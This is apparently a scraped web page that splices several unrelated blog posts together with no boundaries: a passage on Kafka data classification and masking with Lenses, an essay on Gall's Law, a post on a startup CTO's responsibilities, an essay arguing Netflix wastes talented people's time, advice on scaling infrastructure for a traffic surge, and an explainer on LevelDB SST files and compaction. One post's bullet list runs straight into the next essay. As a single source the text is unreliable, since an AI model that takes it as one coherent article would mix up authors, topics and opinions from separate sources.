Fields that can be used to fully identify a person (i.e. Passport or Social Security Number) have to be treated with additional care, whereas information like Country or Postcode can only partially reveal the identity of a subject.</p><p>Here we’ve highlighted data at different impact levels. Social Security Number is very high, whereas postcode is comparatively low.&nbsp;</p><p><code>SSN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;high</code></p><p><code>Financial&nbsp;Account&nbsp;number&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;high</code></p><p><code>Biometric&nbsp;Records&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;high</code></p><p><code>Medical&nbsp;Information&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;high</code></p><p><code>Passport&nbsp;Number&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;high</code></p><p><code>Phone&nbsp;number&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;medium</code></p><p><code>Postcode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;low</code></p><p><code>Religion&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;low</code></p><p>The combination of the Data Policy impact level with the detected streams and applications helps risk managers and compliance officers ensure they apply the appropriate safeguards based on the confidentiality impact level.</p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/2S6rCLEvDuyjOfXDQeUrep/191a6e45b9779abe4dbb0756cad29161/data_policies_1__1_.png" alt="data policies ontology impact levels (1)"></p><h2>Data Masking &amp; PII confidentiality</h2><p>With data discovered and classified, the final step is to redact or anonymize data, so that users can access it whilst meeting compliance.</p><p>For many, this can be one of the biggest compliance challenges you will encounter whilst working with Kafka.&nbsp;</p><p>For Lenses, this is achieved through redaction rules associated with each Policy. </p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/1H7EA7ZDhImZ1K1cLzljR6/792b2c2f602504941683831c9787f061/data_redaction_policy_kafka.png" alt="data redaction policy kafka"></p><p>When data is accessed by a user that matches a Policy, we can automatically anonymize data.&nbsp;&nbsp;</p><p>Here are some examples of redaction policies and how they may mask fields within streaming data.&nbsp;</p><p>Policy&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Sample Data &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Sample Output</p><p>Initials Only &nbsp; &nbsp; &nbsp; &nbsp; Jon Smith&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; J S</p><p>First-3 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (212) 509-6995&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (212) xxx-xxxx</p><p>Last-4&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 4111 4050 6070 8090 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xxxx xxxx xxxx 8090</p><p>Redaction &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 123 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xxx</p><p>Email Mask&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; myEmail@org.com &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a target="_blank" href="mailto:mxxxxx@org.com">mxxxxx@org.com</a></p><p>The masking is applied on-the-fly as opposed to redacting the data at rest or on the wire.

It is not implemented - it is applied. 
</p><p>In fact, features like these are helping data engineers at heavily regulated firms:
</p><ul><li><p> <!-- -->Move their data projects from pilot to production
</p></li><li><p> <!-- -->Reduce their <a target="_blank" href="https://lenses.io/customers/viseca/">time-to-market by 10x
</a></p></li><li><p> <!-- -->Create policies that are easy to remember, and easy to apply
</p></li><li><p> <!-- -->Move forward with a technology-agnostic governance framework

    <p>People often start a new endeavour to realise a vivid dream.  This is good by itself; the dream coupled with strong self-motivation would take them far when the going gets tough (which it usually does).</p>
<p>However, there’s another side to dreams that’s quite dreadful, particularly for someone starting something new<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> and with little experience.</p>

<p>It’s no secret; when learning your work won’t be original, beautiful or fulfilling.  Experience shows us that anyone’s first picture is not far from a scribble.  Almost everyone I know learnt cycling after a crash.</p>
<p>This failure might kill motivation; many new comers to a field exit it as new comers.</p>
<blockquote>
<p>When you’ve a vivid dream, you may not want to sell yourself short; you want to realize the dream as-is, nothing short!</p>
</blockquote>
<p>Your imagination on how you’d perform and what you really do would be worlds apart.  Setting a high goal and not giving enough time is a good recipe for quitters.</p>
<p>Having a high bar is not just unproductive but also unrealistic.  It’s plain wrong to expect it from you or anyone.</p>

<p>Applicable universally but masquerading as a technical law:</p>
<blockquote>
<p><strong>A complex system that works is invariably found to have evolved from a simple system that worked</strong>.  A complex system designed from scratch never works and cannot be patched up to make it work. You have to start over with a working simple system.</p>
</blockquote>
<p>Notice that you could replace “complex system” with “artist” and get something useful:</p>
<blockquote>
<p>A skilled artist who excels has invariably evolved from being a beginner.</p>
</blockquote>
<p>Mind you, this isn’t just to learn fine arts.  I’ve seen this law to be far reaching.  After all it states that things have to be built incrementally; you can’t directly jump to 100 from 0.</p>
<h2 id="applications">Applications</h2>
<p>Here are a few applications from countless ones:</p>
<h3 id="science">Science</h3>
<p>Many inventions weren’t invented directly.  It’s usually built upon years of research and experiments preceding it e.g. radio, car, television, ….  This list is endless.</p>
<h3 id="technology">Technology</h3>
<p>Though the use of computers and human communication has evolved to the point of video calls and conferences, a couple of decades back none of this existed.  However, people were warmed up to this state slowly; not in a day.  They’d to be evolved to understand today’s technology.  <strong>Continuum</strong>: land-line telephones, digital organisers, pagers, keypad phone, touch phone, smart phones!</p>
<h3 id="finance">Finance</h3>
<p>You might have seen some governments introducing a new clause of tax very marginally.  This is the clever way of doing it.  Since the amount is marginal folks mighn’t notice it but when slowly incremented year over year, eventually it’d become a sizeable amount.  They literally go from 0 to 100 unnoticed by warming up the tax payer.</p>

<p>Though super simple, I’ve seen Gall’s Law ignored by many (including myself) in a busy life.  It’s so simple we tend to overlook it; we think we can skip the intermediate steps and directly jump to 100 from 0.</p>
<p>Where did you take a shortcut recently and got bitten by it?</p>
<h2 id="examples">Examples</h2>
<ol>
<li>College kids resigning their first jobs as they don’t like work/salary/role/etc.
<ul>
<li>Wanting to work for a better company, role or salary isn’t a problem</li>
<li>Giving up an <em>existing</em> job to do it may be a problem</li>
<li>Working in the current role is going to give you real-world experience</li>
<li>Quitting and trying to get a job?  <em>A bird in hand is worth two in bush</em>.</li>
<li>Learning at and off work and applying for another company is more realistic</li>
</ul>
</li>
<li>Budding movie directors demanding absolute freedom, wanting to direct the next <em>Academy Award Winner</em>
<ul>
<li>Having this goal is okay but having demands as new comer is probably not</li>
<li>Sure, someone might have gotten an award for their debut movie but probably without expecting it!</li>
<li>The idea is to accept any offer instead of waiting (perpetually) or (worse) quitting!</li>
<li>Take upon offers coming your way and improve gradually</li>
<li>One day your work would be excellent then you’d have realistic terms you could demand</li>
</ul>
</li>
<li>Budding artists refusing to perform in <em>cheap restaurants</em> as they want to only perform on big stages</li>
<li>Over ambitious companies biting more than they can chew
<ul>
<li>Startups shining brightly for a while and then burning out without a steady growth</li>
</ul>
</li>
</ol>
<p>You get the idea!  Secure the basics and then build from there.</p>

<p>Be courageous; sell yourself short and work happily.  Keep working and you’d realise the goal you envision.  Being afraid to work in lower, menial positions and wanting quick success is the wrong frame of mind; it’s a disservice you do to yourself being with that mind frame.  Ideal thinking won’t help; pragmatic thinking will show you the ropes and you’ll eventually hit the spot!</p>
<blockquote>
<p><strong>Progress</strong>, far from consisting in change, <strong>depends on retentiveness</strong>. – George Santayana, The Life of Reason: The Phases of Human Progress</p>
</blockquote>
<p>Growth is almost always a slow, incremental process.  It can’t be fast-tracked.  Winning players are often seen in soiled clothes!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p><span><p>The new buzz word in town is the term CTO. As all industries start to embrace technology as part of the core business, the person incharge of this technology will then start to grow in its important. Do you then know what does the role of a CTO entails? Beyond the glamorous term comes with a ton of responsibilities that is paramount for the development of the company across its stages. If you ever aspire to be a CTO yourself someday, this article is for you.</p>
<br>
<blockquote>
<p>You jump off a cliff and you assemble an airplane on the way down. - Reid Hoffman, founder of LinkedIn</p>
</blockquote>

<p>We will be going through these sections:</p>
<br>
<ol>
<li>
<p>What does CTO do across stages of a startup</p>
</li>
<li>
<p>Challenges</p>
</li>
<li>
<p>Key learnings/ opportunities</p>

<br>
<h2>What does CTO do across stages of a startup</h2>
<br>
<h3>1. Pre-seed stage</h3>

<p>Here you have 0 - 1 developer to basically kick start your entire idea. From git repo initilisation to actually be able to see a UI. Here is where your pre-seed stage will be.</p>
<br>
<ul>
<li>Building the MVP</li>
</ul>

<p>Startup CTOs should be well versed in the tools and technologies available for building MVPs, whether those be web apps, mobile apps, desktop software. They cannot be afraid to get their hands dirty because even if there is a budget to hire a team, the CTO plays backup for any roles that cannot be immediately filled.</p>

<p>You need to create this MVP that can be able to gain real-time user feedback as fast as possible.</p>
<br>
<h3>2. Early startup</h3>

<p>You actually have some intermittent market feedback of a market fit and now you are looking to ramp up your development work. Here, you will look to have 1 - 10 engineers to kick start your development process. I’ve come to believe that different companies sits in this stage for various durations. The size of the engineering team should only appropriately grow in proportion with the performance and traction of the product or service. You do not want to find yourself to be in a situation where you are mass-hiring but each engineers are actually relatively unproductive. You should only ramp up the size of the engineering when you have processes in place to better manage these additional manpower. Truly, many cooks spoil the broth. Listed below are some of the scope of a CTO in the early start phase:</p>
<br>
<ul>
<li>Hiring engineers, IT professionals, and data scientists.</li>
</ul>

<p>Finding and bringing on engineering talent is one of the hardest things for tech startups to do. Hiring for cultural fit at a small startup is challenging. Many developers want to specialize while startups demand generalists.</p>

<p>CTO at a startup has to be good at hiring, onboarding, training, and eventually replacing the company’s technical staffs. Having a proven hiring process and strong network will help.</p>
<br>
<ul>
<li>Figuring out company-wide security</li>
</ul>

<p>When no security policy was done before, it falls onto the lap of CTOs to own the security component, run audits, document security procedures, and train everyone on the basis of it.</p>

<p>Simple security includes a VPN to protect your servers &amp; database from public access.</p>
<br>
<ul>
<li>Product management</li>
</ul>

<p>While the CTOs primary goal is to make the vision of the non-technical product manager a reality, it also means that they have to manage the flow of work into the engineering team. Often times, CTOs take an active role in laying out the product planning process. It is common for startup CTOs to learn both product and technology. Its challenging but learning new things is the norm at startups.</p>
<br>
<ul>
<li>Clear technical debts<br>
A good startup CTO will recognize when poor architecture is slowing down the team, and will step in to settle these technical debts when needed. Eventually these architecture clean ups may be delegated to senior engineers, but it will be likely to fall onto the CTO once in a while.</li>
</ul>
<br>
<ul>
<li>Bug triage</li>
</ul>

<p>First without a Quality Assurance team, it falls onto the CTO to triage bugs, replicate and document down the behavior of the feature, then distribute these bugs to the team for a fix. Deciding how to debug an issue requires detailed understanding of the implementation.</p>
<br>
<ul>
<li>QA and testing</li>
</ul>

<p>Without a proper initial team of quality assurance engineers, the testing layer falls onto the responsibility of the engineering team, headed by the CTO. Planning out the testing layers requires hands-on, hands dirty experiments.</p>
<p>Attached is an article on how to create your testing layer in your company. Check it out <a ref="nofollow" target="_blank" href="https://www.karllhughes.com/posts/testing-layers">here</a>.</p>
<br>
<ul>
<li>DevOps</li>
</ul>

<p>Your servers are your digital assets, and until a DevOps engineer is hired to manage these assets, it will too fall onto the CTO to manage them during the interim period.</p>
<br>
<h3>3. Growth</h3>

<p>Here the company has been gaining traction and is now looking to grow the team from 10 - 100 engineers. The company’s product is starting to mature and people are looking to settle into your company as a possible career-long alternative. In here, then you have to focus on ensuring employee retention and a healthy career progression for each of your employees.</p>
<br>
<ul>
<li>Vendor and customer relationship</li>
</ul>

<p>The CTO has to be clear to figure out what is needed to be done to streamline the company’s technical cost. It could be for the developers processes, or the company’s process through technology.<br>
This is essential if the product is starting to integrate with other softwares or has its own API. The external technical relationships will be the responsibility of the CTO. This is essential if we have power users whom are integrating with us, requesting for some ‘must-have’ features.</p>
<br>
<ul>
<li>Team growth management</li>
</ul>

<p>Managing a team of 5 is different from managing a team of 100. Once the company expands and grow, you will start to hire more specialised engineers which isn’t looking for exciting and challenging tasks. Their focus will just be the traditional benefits, vacation days, and a structured career ladder. The ability to develop the skillset to manage the startup across different life stages will also be the challenge the CTO has to undergo.</p>
<br>
<ul>
<li>Employee retention</li>
</ul>

<p>The early employees whom joined for the challenges may consider other options as the startup phases into a mid-sized startup. As tech workers has plenty of options, its rare to keep one for more than 2, 3 years. The CTO that moves the company across phases has to learn how to retain their employees with strong alignment to the worker’s personal goals.</p>
<br>
<h3>4. Expansion</h3>

<p>Generally, once you are in the phase of expansion, you have to be laser focused to get your technology vision and mission in your company. This does not imply that your company has to utilize the latest technology all the time. Fundamentally, what is your company’s vision and problem statement? Focus on that, and ensure that we are using the best technology available out there to achieve this goal.</p>

<br>
<h2>Challenges</h2>

<p>The challenges a CTO face will be endless. Even as a developer, the amount of challenges you face are endless and everyday you have a ton of todos and blockers to clear. More specifically for CTOs, just as I was reading up on the this aspect, the key challenges faced by all CTOs are primarily hiring and alignment with business people.</p>
<br>
<h3>1. Hiring</h3>

<p>Good engineers that can help you to marry business and technology are hard to find. It will be all the more in demand in times when the world is embracing digital transformation. Even investors are willing to put their millions into savings plans through video calls. It is key to hire not just gifted engineers but those whom will also help shape the culture of the business.</p>
<br>
<h3>2. Focusing on customer engagement</h3>

<p>If you want to create a good technology, it is only just as good as whom the technology is created for. You may create the world’s first robotic arm for minimally invasive surgery but if i’m only washing dishes, why would that be of value to me? You have to benchmark the quality of your product to the utility of your target audience. They have the valuable feedback. In a world where there is a imperfect information, one can only move in the most informed decision; but always with a certain level of uncertainty and risk. Continuously engage with your ‘customers’ and find out what will empower them and set them up to do more with less using your product.</p>
<br>
<hr>
<br>
<h2>5 Key learning opportunities</h2>

<p>Not everyone is born ready for such a big role. It will stretch you, ‘forces’ you to rise up to the occasion and you may even be surprised by what you are able to achieve when you’re placed under the pressurized cooker of your business demands. Generally, CTO is a leadership role. As glamorous as it may sound, it is still in essence just a role. What is most important is the being that is placed in that role. Are you developing yourself to face the bigger problems that are before you?</p>
<br>
<ol>
<li>
<p>Technical knowledge</p>
</li>
<li>
<p>Technical leadership and strategy planning</p>
</li>
<li>
<p>Communication and Mentoring</p>
</li>
<li>
<p>Project management and Operational excellence</p>
</li>
<li>
<p>Sense of entrepreneurship and anticipation of the future</p>
</li>
</ol>

<p>What better way to find out your key areas of learning opportunities than to hear from founders themselves. Here’s a video that sums this up</p>

<br>
<h2>TLDR;</h2>

<p>The end goal, the article gives a in-depth glimpse into the scope of a CTO’s day to day. How then can one possibly keep up with this pace of work? Only if you have a clear vision of the possible future. Technology is no longer just a tool for your Business-as-usual. It could possibly shape your future and redesign how life could be, should be, and will be.</p>

<p>From here on, I wish to share with you all a really cool podcast called <a ref="nofollow" target="_blank" href="https://moderncto.io/">Modern CTO</a>. It is a podcast whom CTOs of all different companies will share some of their thoughts, journey, and learnings as CTOs. One thing is common: their level of curiosity for the world around them. Whatever role you are to play, stay curious and be a future explorer!</p>
<br>
<hr>
<br>
<h2>JDs and scope of CTOs across all stages of startup</h2>

<p>Vision &amp; Strategy</p>
<ul>
<li>Setting a vision for how technology will be used in the company.</li>
</ul>

<p>R&amp;D</p>
<ul>
<li>Outline the goals for research and development.</li>
<li>Research any new technologies that may potentially increase our company’s competitive …</li></ul></span></p></div></div>

            <section>
                <div>
                    <p>It has become fashionable to lambast big tech corporations and social media sites, the Facebooks and Twitters and Googles, blaming them for a litany of social ills. Seemingly escaping this ire has been the—in my view—most pernicious by far: Netflix.</p><p>Simply put, Netflix (and its imitators) produce too many TV shows that are too good—and too easy to binge. Consequently, too many great minds spend their time watching TV rather than thinking and inventing and creating.</p><h2 id="the-greatness-we-lose">The Greatness We Lose</h2><p>Consider the writer Matthew Yglesias. He just wrote an excellent <a href="https://www.amazon.com/One-Billion-Americans-Thinking-Bigger/dp/0593190211/">book</a>, which partially inspired my <a href="https://www.forourposterity.com/canada-and-mexico-should-join-the-union/">last post</a>. Recently, Yglesias <a href="https://web.archive.org/web/20200912220900/https://twitter.com/mattyglesias/status/1304904789055156225">tweeted</a>:</p><blockquote>Someone asked … “how’d you get this book written without taking time off work?” and the dumb boring answer was basically “didn’t watch much TV for six months.”</blockquote><p>He adds,</p><blockquote>I am perfectly aware that the difference between times when I’m most productive &amp; creative and times when I’m not is how much of the week I waste on watching television, yet tonight I’m almost certainly going to finish season two of Hannibal.</blockquote><p>Yglesias, turn off the TV! Write more books instead! Heck, write more tweets, if you prefer!</p><p>Just think of all the original ideas Yglesias could be contributing if he continued to abstain from watching TV. Of them we are being robbed. That is an epic <a href="https://applieddivinitystudies.com/murder-of-wilbur/">tragedy</a>.</p><h2 id="why-modern-tv-is-different">Why Modern TV Is Different</h2><p>I don’t mean to pick on Yglesias. In fact, I don’t blame him. Modern shows are just too good. As a result, it’s become accepted—even the norm—among elite, educated classes to watch inordinate amounts of TV.</p><p>Modern shows are different from classic TV in two key ways. First, they are much more engrossing. Netflix shows are just on a different level in terms of quality than what TV once offered. Second, they are bingeable. Instead of tuning in for an hour each week, Netflix encourages viewers to enter the dark hole of watching episode after episode after episode. This becomes a vicious cycle. Viewers binge late into the night, lose sleep, and then don’t feel energetic enough to do much in their free time the next day besides…watching more Netflix.</p><p>Movies were always pretty engrossing. But the boundless quantity of content on Netflix—as well as their deliberate addictiveness—puts it on a different level.</p><p>To be sure, the broad America public has always watched <a href="https://www.theatlantic.com/technology/archive/2018/05/when-did-tv-watching-peak/561464/">extraordinary amounts</a> of television, in particular retirees. For them, the improved quality of modern shows is surely an upgrade. But I do think Netflix has distinctly changed the culture around TV among the young and educated.</p><p>As an undergraduate at Columbia, it was extremely common for students to spend much of their free time engorging themselves on Netflix. Many were caught in that maelstrom of bingeing, losing sleep, and then bingeing more. What was most shocking was this practice’s sheer acceptability. Watching dozens of hours of Netflix a week wasn’t something out of the ordinary, something people were embarrassed by. Rather, Netflix bingeing was a core part of the culture, something people would make countless memes about and base their identities on. Amazingly, people’s chief complaint was often that they had exhausted all of Netflix’s content (how do you even do that?!).</p><p>Yglesias got his start blogging in college. Would the next Yglesias be able to do the same? Or would his free time and energy instead be sucked up by the latest, ever-more addictive Netflix show? What a loss for civilization that would be.</p><h2 id="for-a-new-temperance-movement">For a New Temperance Movement</h2><p>Again, I don’t blame the students. I am victim to the same human follies. But I do blame the culture we have created. We don’t tell our bright young minds that it’s alright to waste away your days drinking or abusing drugs. Sure, some end up doing so regardless, but the cultural tabu keeps those impulses in check. Why do we tell them it’s alright to waste away your days watching Netflix?</p><p>Indeed, there has been considerable pushback against video games, which for some are a similar time suck. While many still struggle, this cultural pushback has kept video games in check. At least among the educated classes, Netflix and its imitators have become the far greater time suck.</p><p>For those who can enjoy TV in moderation—great. Modern shows are often meaningful art worth appreciating. The problem with modern TV is that for many, it is closer to alcoholism than a one-off drink. One you watch that first episode—take that first drink—it often doesn’t stay at one episode—as it doesn’t stay at one drink.</p><p>Perhaps it is time for a modern TV-temperance movement. It would be worth encouraging moderation in TV consumption in general. But given that many TV habits resemble alcoholism, it may be appropriate to take a more radical approach: advocating TV-abstinence. Although complete avoidance of TV may be difficult at first, once it becomes a habit, I think most wouldn’t miss much. But they would enjoy an abundance of reclaimed time and energy. And the rest of us would enjoy the wonderful works they create with that newfound time and energy.</p><h2 id="brains-in-vats">Brains in Vats</h2><p>The culture we establish around Netflix matters not just for the present, but for what comes next. As entertainment technology relentlessly advances, are we destined to become brains in vats, nominally pumped full of artificial bliss but doomed to lives of passivity and complacency?</p><p>Look, if that’s what the Europeans want to do, they should go for it. But part of what makes America special is a certain harshness—first embodied in the Puritans and their quest to settle America’s unforgiving wilderness. Great achievements, new ideas, ingenious inventions emerge from a culture that prizes travail and perseverance, not one that prioritizes comfort and ephemeral satisfaction.</p><p>A blithe acceptance of Netflix has insidiously infiltrated our culture. We should push back. Let’s look to the stars, not the next episode.</p>

<p><em>Tips and tricks gained from experience to scale your tech stack really, really fast.</em></p>



<p>Your company has planned a massive marketing campaign. Millions of households are going to view the company’s advertisement during a prime time television show. An enormous number of users are expected to try out your company’s application. You, the engineer, has been given a couple of weeks to scale the tech stack to handle this massive traffic surge.</p>



<p>What do you do?</p>



<p>I am assuming that you are using a public cloud. If not, good luck(use this opportunity to make a case to your decision-makers to <a rel="noreferrer noopener" href="https://abhyrama.com/2019/06/08/cloud-movement/" target="_blank">move to the cloud</a>).</p>



<div><figure><a href="https://voidbetweenears.files.wordpress.com/2020/12/toys-4982760_640.jpg"><img data-attachment-id="1411" data-permalink="https://abhyrama.com/toys-4982760_640/" data-orig-file="https://voidbetweenears.files.wordpress.com/2020/12/toys-4982760_640.jpg" data-orig-size="640,427" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;4&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Canon EOS RP&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;100&quot;,&quot;iso&quot;:&quot;100&quot;,&quot;shutter_speed&quot;:&quot;0.01&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="toys-4982760_640" data-image-description="" data-medium-file="https://voidbetweenears.files.wordpress.com/2020/12/toys-4982760_640.jpg?w=300" data-large-file="https://voidbetweenears.files.wordpress.com/2020/12/toys-4982760_640.jpg?w=640" src="https://voidbetweenears.files.wordpress.com/2020/12/toys-4982760_640.jpg?w=640" alt="" srcset="https://voidbetweenears.files.wordpress.com/2020/12/toys-4982760_640.jpg 640w, https://voidbetweenears.files.wordpress.com/2020/12/toys-4982760_640.jpg?w=150 150w, https://voidbetweenears.files.wordpress.com/2020/12/toys-4982760_640.jpg?w=300 300w" sizes="(max-width: 640px) 100vw, 640px"></a></figure></div>



<h2>Preliminary</h2>



<p>Get a rough sense of the traffic surge—take help from your marketing team for a guesstimate. Use this number as the anchor in all the subsequent steps.</p>



<h2>Horizontal scaling is the mantra</h2>



<p>All cloud providers have some form of autoscaling—on-demand addition of servers based on specific conditions. Utilize this to the hilt. Figure out the thresholds for autoscaling. There will be a lag between the autoscaling condition being met and the addition of the server—plan for margin of safety. Lean on the side of over-provisioning than under-provisioning when the entire world’s eye is on you.</p>



<p>If you have sticky sessions or local server persistence that span multiple requests, now is the time to refactor your application to be <a href="https://abhyrama.com/2020/04/28/the-three-pillars-of-scalability/" target="_blank" rel="noreferrer noopener">stateless</a>—on a war footing.</p>



<h2>Make scaling someone else’s problem</h2>



<p>CDN is a one-word answer to all scaling problems. Wherever possible, offload traffic to a CDN. One successful result from the CDN is one less hit to your backend.</p>



<p>Like CDN, many other frameworks help you scale seamlessly—Firebase, DynamoDB, etc. Leverage these to the maximum.</p>



<h2>Cache, cache, cache, and cache some more</h2>



<p>When one thinks of a cache, Redis or Memcache come to mind—do not restrict yourself narrowly to these.</p>



<p>Visualize your application in layers and see what can be cached(sometimes implicitly) at each of those layers—client, proxy servers, load balancer, web server, application server, middleware, database, and the operating system.</p>



<p>HTTP has many ways of <a rel="noreferrer noopener" href="https://www.mnot.net/cache_docs/" target="_blank">caching</a>—cache headers and ETags. Utilize all these to the hilt. One less hit to your backend is one less scaling woe.</p>



<p>If you are not using <a href="https://abhyrama.com/2020/02/04/becoming-a-guru-programmer/" target="_blank" rel="noreferrer noopener">connection and object pooling</a> in your application, now is the time to look into those—<a rel="noreferrer noopener" href="https://abhyrama.com/2020/03/31/wild-wild-world-of-external-calls/" target="_blank">creating and closing connections</a>(and objects) can get expensive, especially under heavy load.</p>



<h2>Know your limits</h2>



<p>If you are doing this exercise for the first time, your stack—server, libraries, VM, OS, and dependent components like databases, caches, etc.—are probably running with defaults that came out of the box.</p>



<p>Identify all the parameters(configurations) that matter and tune them—connection limits, file descriptor(IO) limits, thread counts, timeouts, pool, and memory settings.</p>



<p>Trace the critical paths in your application and gauge third-party dependencies(external services from other vendors) on these paths. Talk to these third parties and make sure they are ready to handle the extra load coming from you—do not let them be the weakest link in the chain.</p>



<p>Talk to your cloud provider(s) and ask them to increase the limits. All cloud providers have soft limits on resources. Check with your account manager and request a limit increase.</p>



<h2>The chink in your scaling armor</h2>



<p>The database is going to be the chink in your scaling armor. Use the traffic guesstimate you did to make sure that your database will hold up. Know the limits of your database(previous section) and tune for performance. Simultaneously, do not underestimate modern-day databases and servers. They can handle a ridiculous amount of load as long as you are not doing something stupid(if you are a <a href="https://abhyrama.com/2014/08/23/we-are-a-startup/" target="_blank" rel="noreferrer noopener">hyper-growth startup</a>, you probably are doing multiple stupid things; time to fix those).</p>



<p>If you believe your database will not be able to service the load, cache, cache, and then cache some more. If you have write-heavy traffic, then pray to God. Or, use a <a href="https://abhyrama.com/2018/09/14/ode-to-queues/" target="_blank" rel="noreferrer noopener">queue</a>(<a href="https://abhyrama.com/2014/10/25/sqs-versus-kinesis/" target="_blank" rel="noreferrer noopener">async processing</a>) and/or figure out a way to delay and spread the writes(write-back cache).</p>



<h2>The ever seeing eye</h2>



<p>Have <a href="https://abhyrama.com/2019/01/05/now-you-see-me/" target="_blank" rel="noreferrer noopener">observability</a> in place. Murphy’s law states that whatever can go wrong will go wrong. When this happens during stressful times like a high decibel marketing campaign, and you are running blind to what is happening, cortisol levels go through the roof and tear you to pieces. Observability is the calming friend you lean on during these pressing times.</p>



<h2>Conclusion</h2>



<p>Have a <a href="https://abhyrama.com/2018/08/31/checklist/" target="_blank" rel="noreferrer noopener">checklist</a> of all these, and make sure you tick them off as and when you close them. Having a list is critical as these can be stressful times, and losing track of what needs to be done, what has been done, and what is pending is easy.</p>



<p>You might be wondering why I did not ask you to do a performance test.</p>



<p>Doing a performance test and figuring out all the bottlenecks would be the theoretical(and systematic) way to go about this. The problem with performance testing is that carrying out one is challenging and requires expertise and experience. Also, mimicking real-world traffic and user behavior through a performance test is tough. If you know how to do that, you might as well know all the scaling tricks that I mentioned here(you are not the audience for this post).</p>



<p><em>If it is not obvious, I am borrowing the term <a rel="noreferrer noopener" href="https://www.blitzscaling.com/" target="_blank">Blitzscaling</a> coined by Reid Hoffman.</em></p>

<p>LevelDB is an open-source library created by Jeff Dean and Sanjay Ghemawat at Google. It implements a Log Structured Merge Tree which provides very fast writes, independent of the size of the database and scan capabilities which make LevelDB the ideal storage library for a time series database.</p>



<p>That's why the standalone version of <a href="https://warp10.io/" target="_blank" rel="noreferrer noopener">Warp 10</a>, our Time Series Platform, persists its data on disk using the <a href="https://en.wikipedia.org/wiki/LevelDB" target="_blank" rel="noreferrer noopener">LevelDB</a> library. </p>



<p><strong>LevelDB is very robust and rather simple, but understanding how it works could benefit from a clear explanation.</strong> This is what this blog post aims at doing, providing you with sufficient knowledge to understand how LevelDB behaves and ultimately how your Warp 10 instance performs.</p>

<p>Data pushed to LevelDB ends up in files called SST files, SST for <em>Sorting String Table</em>. An SST is a lexicographically sorted list of key/value pairs where both keys and values are byte arrays. SST files are immutable, meaning that once created they will not be altered. They may be removed during a process called <em>compaction</em>. SST files are all the files with the suffix <code>.sst</code> in your <code>leveldb</code> directory. SST files are organized in <em>levels</em>.</p>



<p>Having a Log-Structured Merge-Tree architecture, LevelDB does not store data directly in SST files. It stores new key/value pairs mutations (either additions or deletions) in a <a rel="noreferrer noopener" href="https://blog.senx.io/captains-log-stardate-4353-3/" target="_blank">log</a> file. This log file is the file with the <code>.log</code> suffix in your <code>leveldb</code> directory. The data stored in the log file is also stored in a memory structure called the <em><strong>memtable</strong></em>.</p>



<p>When the log file reaches a certain size (around 4 MB), its content is transferred to a new SST file and a new log file and memtable are initiated, the previous memtable is discarded. Those fresh SST files are collectively called the<strong> <em>level 0</em> files</strong>. Files at level 0 are special because their keys can overlap since they are simply copies of the various log files.</p>



<p><strong>When the number of files at level 0 reaches a threshold (around 10 files), a compaction is triggered. </strong>Compaction will choose a set of overlapping files at level 0 and a set of files they overlap at the next level (level 1) and will merge the data in those files to create a new set of SST files at level 1. The chosen SST files are then discarded.</p>



<p>LevelDB continuously inspects files at each level and triggers compactions when the number of files or the total size at a given level goes beyond a set threshold. <strong>LevelDB manages 7 levels of files.</strong> The list of current SST files is kept in a <code>MANIFEST</code> file. The id of the current MANIFEST file is stored in the <code>CURRENT</code> file.</p>



